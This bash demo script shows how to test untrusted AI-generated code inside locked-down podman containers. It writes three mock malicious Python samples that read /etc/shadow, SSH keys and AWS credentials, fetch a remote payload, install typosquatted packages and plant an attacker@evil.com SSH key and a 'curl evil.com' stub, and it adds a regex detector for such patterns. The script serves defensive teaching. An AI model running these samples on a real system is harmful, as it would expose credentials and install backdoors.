#!/bin/bash
set -euo pipefail

# AI Code Isolation Demo for Episode 0
# Demonstrates safe testing of AI-generated or untrusted code

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

echo -e "${PURPLE}🛡️  AI Code Isolation Demo${NC}"
echo "==============================="

# Create demo directory
DEMO_DIR="$HOME/ai-code-isolation-demo"
mkdir -p "$DEMO_DIR"
cd "$DEMO_DIR"

echo -e "${BLUE}📁 Working in: $DEMO_DIR${NC}"

# Function to create potentially suspicious AI-generated code examples
create_suspicious_code() {
    echo -e "${YELLOW}⚠️  Creating examples of suspicious AI-generated code...${NC}"
    
    # Example 1: Code that tries to access sensitive files
    cat << 'EOF' > suspicious_file_access.py
#!/usr/bin/env python3
"""
AI-generated code that might try to access sensitive information
This is a simulation - DO NOT run on host system!
"""
import os
import sys

def analyze_system():
    """Analyze system configuration - looks innocent but isn't"""
    sensitive_files = [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/ssh/sshd_config',
        '/home/.ssh/id_rsa',
        '~/.aws/credentials',
        '~/.bashrc'
    ]
    
    results = {}
    for file_path in sensitive_files:
        try:
            expanded_path = os.path.expanduser(file_path)
            if os.path.exists(expanded_path):
                with open(expanded_path, 'r') as f:
                    content = f.read()
                    results[file_path] = {
                        'exists': True,
                        'size': len(content),
                        'preview': content[:100] + '...' if len(content) > 100 else content
                    }
                    print(f"📄 Found: {file_path} ({len(content)} bytes)")
        except PermissionError:
            results[file_path] = {'exists': True, 'readable': False}
            print(f"🔒 Access denied: {file_path}")
        except FileNotFoundError:
            results[file_path] = {'exists': False}
            print(f"❌ Not found: {file_path}")
        except Exception as e:
            results[file_path] = {'error': str(e)}
            print(f"⚠️  Error accessing {file_path}: {e}")
    
    return results

if __name__ == "__main__":
    print("🔍 System Analysis Starting...")
    data = analyze_system()
    print(f"📊 Analysis complete. Found {len([k for k, v in data.items() if v.get('exists')])} files.")
    
    # This could potentially exfiltrate data
    print("💾 Saving results...")
    with open('/tmp/system_analysis.json', 'w') as f:
        import json
        json.dump(data, f, indent=2)
    print("Results saved to /tmp/system_analysis.json")
EOF

    # Example 2: Code that tries to make network connections
    cat << 'EOF' > suspicious_network.py
#!/usr/bin/env python3
"""
AI-generated code that might try to exfiltrate data or download malicious content
"""
import urllib.request
import urllib.parse
import socket
import json
import os

def check_connectivity():
    """Check internet connectivity - seems innocent"""
    test_urls = [
        'http://httpbin.org/ip',
        'https://api.github.com',
        'http://example.com',
        'https://raw.githubusercontent.com/user/repo/main/payload.py'  # Suspicious
    ]
    
    results = []
    for url in test_urls:
        try:
            print(f"🌐 Testing connection to: {url}")
            response = urllib.request.urlopen(url, timeout=5)
            content = response.read().decode('utf-8')
            
            if 'payload.py' in url:
                # This could execute downloaded code!
                print(f"📥 Downloaded code from {url}")
                print("⚠️  This could be dangerous if executed!")
            
            results.append({
                'url': url,
                'status': 'success',
                'content_length': len(content),
                'content_preview': content[:200] + '...' if len(content) > 200 else content
            })
            
        except Exception as e:
            print(f"❌ Failed to connect to {url}: {e}")
            results.append({
                'url': url,
                'status': 'failed',
                'error': str(e)
            })
    
    return results

def gather_system_info():
    """Gather system information for 'analysis'"""
    info = {
        'hostname': socket.gethostname(),
        'cwd': os.getcwd(),
        'user': os.environ.get('USER', 'unknown'),
        'home': os.environ.get('HOME', 'unknown'),
        'path': os.environ.get('PATH', 'unknown')[:200] + '...',
        'python_path': os.sys.path
    }
    return info

if __name__ == "__main__":
    print("🔗 Network Connectivity Test")
    print("============================")
    
    # Gather system info
    system_info = gather_system_info()
    print(f"🖥️  System: {system_info['hostname']}")
    print(f"👤 User: {system_info['user']}")
    
    # Test network connections
    connectivity = check_connectivity()
    
    # Could potentially send data out
    combined_data = {
        'system_info': system_info,
        'connectivity_results': connectivity
    }
    
    print("\n📊 Analysis Summary:")
    print(f"- System hostname: {system_info['hostname']}")
    print(f"- Successful connections: {len([r for r in connectivity if r['status'] == 'success'])}")
    print("- Data collection complete")
EOF

    # Example 3: Code that tries to modify system
    cat << 'EOF' > suspicious_system_mod.py
#!/usr/bin/env python3
"""
AI-generated code that might try to modify the system
"""
import os
import subprocess
import tempfile
import shutil

def install_dependencies():
    """Install required dependencies - might install malicious packages"""
    suspicious_packages = [
        'requests',  # Legitimate
        'flask',     # Legitimate
        'pyxl0ad3r', # Suspicious - typosquatting
        'ur11ib3',   # Suspicious - typosquatting urllib3
    ]
    
    print("📦 Installing dependencies...")
    for package in suspicious_packages:
        try:
            print(f"Installing {package}...")
            # This would actually install packages - dangerous!
            result = subprocess.run([
                'pip', 'install', package
            ], capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                print(f"✅ {package} installed successfully")
            else:
                print(f"❌ Failed to install {package}: {result.stderr}")
                
        except subprocess.TimeoutExpired:
            print(f"⏰ Timeout installing {package}")
        except Exception as e:
            print(f"⚠️  Error installing {package}: {e}")

def create_persistent_files():
    """Create configuration files - might create backdoors"""
    config_files = [
        ('~/.bashrc_backup', 'export PATH=$PATH:/tmp/malicious'),
        ('/tmp/system_monitor.py', 'import subprocess; subprocess.run(["curl", "evil.com"])'),
        ('~/.ssh/authorized_keys_backup', 'ssh-rsa AAAAB3... attacker@evil.com')
    ]
    
    print("📝 Creating configuration files...")
    for filepath, content in config_files:
        try:
            expanded_path = os.path.expanduser(filepath)
            os.makedirs(os.path.dirname(expanded_path), exist_ok=True)
            
            with open(expanded_path, 'w') as f:
                f.write(content)
            print(f"📄 Created: {filepath}")
            
        except Exception as e:
            print(f"⚠️  Failed to create {filepath}: {e}")

if __name__ == "__main__":
    print("🔧 System Setup Script")
    print("======================")
    
    print("⚠️  WARNING: This script modifies your system!")
    print("Only run this in a secure, isolated environment.")
    
    # These operations could be dangerous
    install_dependencies()
    create_persistent_files()
    
    print("✅ Setup complete")
EOF

    echo -e "${GREEN}✅ Created suspicious code examples${NC}"
}

# Function to demonstrate safe isolation
demonstrate_isolation() {
    echo -e "\n${BLUE}🔒 Demonstrating Safe Code Isolation${NC}"
    
    # Test 1: File Access Isolation
    echo -e "\n${YELLOW}Test 1: File Access Protection${NC}"
    echo "Running file access code in isolated container..."
    
    podman run -it --rm \
        --name ai-code-test-files \
        --security-opt no-new-privileges \
        --cap-drop ALL \
        --read-only \
        --tmpfs /tmp:rw,noexec,nosuid,size=50m \
        --network none \
        --memory 256m \
        --cpus 0.5 \
        -v "$(pwd)/suspicious_file_access.py:/app/test.py:ro" \
        python:3.11-alpine python /app/test.py
    
    echo -e "${GREEN}✅ File access safely contained${NC}"
    
    # Test 2: Network Isolation
    echo -e "\n${YELLOW}Test 2: Network Access Protection${NC}"
    echo "Running network code in isolated container (no network)..."
    
    podman run -it --rm \
        --name ai-code-test-network \
        --security-opt no-new-privileges \
        --cap-drop ALL \
        --read-only \
        --tmpfs /tmp:rw,noexec,nosuid,size=50m \
        --network none \
        --memory 256m \
        --cpus 0.5 \
        -v "$(pwd)/suspicious_network.py:/app/test.py:ro" \
        python:3.11-alpine python /app/test.py
    
    echo -e "${GREEN}✅ Network access successfully blocked${NC}"
    
    # Test 3: System Modification Protection
    echo -e "\n${YELLOW}Test 3: System Modification Protection${NC}"
    echo "Running system modification code in protected container..."
    
    podman run -it --rm \
        --name ai-code-test-system \
        --security-opt no-new-privileges \
        --cap-drop ALL \
        --read-only \
        --tmpfs /tmp:rw,noexec,nosuid,size=50m \
        --network none \
        --memory 256m \
        --cpus 0.5 \
        -v "$(pwd)/suspicious_system_mod.py:/app/test.py:ro" \
        python:3.11-alpine sh -c "
            echo 'Container environment info:'
            whoami
            pwd
            df -h
            echo 'Running potentially dangerous code...'
            python /app/test.py
        "
    
    echo -e "${GREEN}✅ System modifications safely contained${NC}"
}

# Function to demonstrate controlled testing
demonstrate_controlled_testing() {
    echo -e "\n${BLUE}🧪 Demonstrating Controlled Testing Environment${NC}"
    
    # Create a controlled environment with limited network access
    echo "Creating controlled environment with limited capabilities..."
    
    # First, test with no network
    echo -e "\n${YELLOW}Stage 1: Complete isolation test${NC}"
    podman run -it --rm \
        --name controlled-test-stage1 \
        --security-opt no-new-privileges \
        --cap-drop ALL \
        --memory 512m \
        --cpus 1.0 \
        --tmpfs /workspace:rw,size=100m \
        --network none \
        -v "$(pwd):/code:ro" \
        python:3.11-alpine sh -c "
            cd /workspace
            cp /code/suspicious_file_access.py ./
            echo '=== Testing in complete isolation ==='
            python suspicious_file_access.py
            echo '=== Test complete ==='
            ls -la /tmp/
        "
    
    # Then, test with limited network (if needed)
    echo -e "\n${YELLOW}Stage 2: Limited network access test${NC}"
    echo "Testing with restricted network access..."
    
    # Create a custom network with DNS only
    podman network create --driver bridge ai-test-net 2>/dev/null || true
    
    podman run -it --rm \
        --name controlled-test-stage2 \
        --security-opt no-new-privileges \
        --cap-drop ALL \
        --cap-add NET_BIND_SERVICE \
        --memory 512m \
        --cpus 1.0 \
        --tmpfs /workspace:rw,size=100m \
        --network ai-test-net \
        -v "$(pwd):/code:ro" \
        python:3.11-alpine sh -c "
            cd /workspace
            cp /code/suspicious_network.py ./
            echo '=== Testing with limited network ==='
            # Show what network access we have
            nslookup google.com || echo 'DNS resolution blocked'
            # Try the suspicious code
            timeout 15s python suspicious_network.py || echo 'Network operations timed out or failed'
            echo '=== Test complete ==='
        "
    
    # Cleanup network
    podman network rm ai-test-net 2>/dev/null || true
}

# Function to demonstrate AI code review process
demonstrate_code_review() {
    echo -e "\n${BLUE}🔍 AI Code Review Process${NC}"
    
    # Create a simple static analysis
    cat << 'EOF' > code_analyzer.py
#!/usr/bin/env python3
"""
Simple static analysis for AI-generated code
"""
import re
import os
import sys

# Suspicious patterns to look for
SUSPICIOUS_PATTERNS = [
    (r'exec\(', 'Code execution from string'),
    (r'eval\(', 'Dynamic code evaluation'),
    (r'__import__\(', 'Dynamic module import'),
    (r'subprocess\.run\(', 'System command execution'),
    (r'os\.system\(', 'System command execution'),
    (r'urllib\.request\.urlopen\(', 'Network request'),
    (r'requests\.get\(', 'HTTP request'),
    (r'socket\.socket\(', 'Network socket'),
    (r'/etc/passwd', 'Sensitive file access'),
    (r'/etc/shadow', 'Sensitive file access'),
    (r'~/.ssh/', 'SSH key access'),
    (r'~/.aws/', 'AWS credential access'),
    (r'input\(.*password.*\)', 'Password prompt'),
    (r'getpass\.getpass\(', 'Password input'),
]

def analyze_file(filepath):
    """Analyze a Python file for suspicious patterns"""
    print(f"\n🔍 Analyzing: {filepath}")
    print("=" * (len(filepath) + 12))
    
    try:
        with open(filepath, 'r') as f:
            content = f.read()
        
        issues = []
        lines = content.split('\n')
        
        for i, line in enumerate(lines, 1):
            for pattern, description in SUSPICIOUS_PATTERNS:
                if re.search(pattern, line, re.IGNORECASE):
                    issues.append({
                        'line': i,
                        'content': line.strip(),
                        'issue': description,
                        'pattern': pattern
                    })
        
        if issues:
            print(f"⚠️  Found {len(issues)} potential issues:")
            for issue in issues:
                print(f"  Line {issue['line']:3d}: {issue['issue']}")
                print(f"           {issue['content'][:80]}{'...' if len(issue['content']) > 80 else ''}")
                print()
        else:
            print("✅ No suspicious patterns detected")
            
        return issues
        
    except Exception as e:
        print(f"❌ Error analyzing {filepath}: {e}")
        return []

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python code_analyzer.py <file1> [file2] ...")
        sys.exit(1)
    
    total_issues = 0
    for filepath in sys.argv[1:]:
        if os.path.exists(filepath):
            issues = analyze_file(filepath)
            total_issues += len(issues)
        else:
            print(f"❌ File not found: {filepath}")
    
    print(f"\n📊 Analysis Summary: {total_issues} total potential issues found")
    if total_issues > 0:
        print("⚠️  Review these issues before executing any code!")
    else:
        print("✅ Code appears safe from common suspicious patterns")
EOF

    # Run the analysis on our suspicious code
    echo "Running static analysis on suspicious code examples..."
    
    podman run -it --rm \
        --name code-analyzer \
        --security-opt no-new-privileges \
        --cap-drop ALL \
        --read-only \
        --tmpfs /workspace:rw,size=50m \
        --network none \
        --memory 256m \
        -v "$(pwd):/code:ro" \
        python:3.11-alpine sh -c "
            cd /workspace
            cp /code/*.py ./
            echo '🔍 Static Analysis Results:'
            python code_analyzer.py suspicious_*.py
        "
    
    echo -e "${GREEN}✅ Static analysis complete${NC}"
}

# Main execution
main() {
    echo -e "${PURPLE}🚀 Starting AI Code Isolation Demo${NC}"
    
    # Create suspicious code examples
    create_suspicious_code
    
    # Demonstrate safe isolation
    demonstrate_isolation
    
    # Demonstrate controlled testing
    demonstrate_controlled_testing
    
    # Demonstrate code review process
    demonstrate_code_review
    
    echo -e "\n${GREEN}🎉 Demo Complete!${NC}"
    echo -e "${BLUE}Key Takeaways:${NC}"
    echo "1. 🛡️  Containers provide strong isolation for testing untrusted code"
    echo "2. 🔒 Rootless containers with dropped capabilities are much safer"
    echo "3. 🚫 Network isolation prevents data exfiltration"
    echo "4. 📁 Read-only filesystems prevent persistent modifications"
    echo "5. ⚡ Resource limits prevent DoS attacks"
    echo "6. 🔍 Static analysis helps identify suspicious patterns"
    
    echo -e "\n${YELLOW}Remember: Container isolation is strong but not perfect.${NC}"
    echo "Always review code manually and use multiple security layers!"
    
    # Cleanup
    echo -e "\n${BLUE}🧹 Cleaning up demo files...${NC}"
    read -p "Remove demo directory? (y/N): " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        rm -rf "$DEMO_DIR"
        echo "✅ Demo directory cleaned up"
    else
        echo "Demo files kept in: $DEMO_DIR"
    fi
}

# Run the demo
main "$@"